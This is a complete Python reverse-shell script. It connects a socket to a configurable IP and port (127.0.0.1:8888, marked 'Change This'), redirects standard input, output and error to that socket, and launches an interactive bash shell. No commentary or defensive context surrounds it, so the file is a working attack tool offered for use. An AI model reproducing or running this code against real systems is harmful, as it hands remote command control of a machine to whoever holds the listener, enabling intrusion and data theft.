#!/usr/bin/python3
import os
import subprocess
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip="127.0.0.1"
port=8888
s.connect((ip,port))  # Change This
os.dup2(s.fileno(),0) # Map stdin to s.fileno()
os.dup2(s.fileno(),1) # Map stdout to s.fileno()
os.dup2(s.fileno(),2) # Map stderr to s.fileno()
p=subprocess.call(["/bin/bash","-i"])
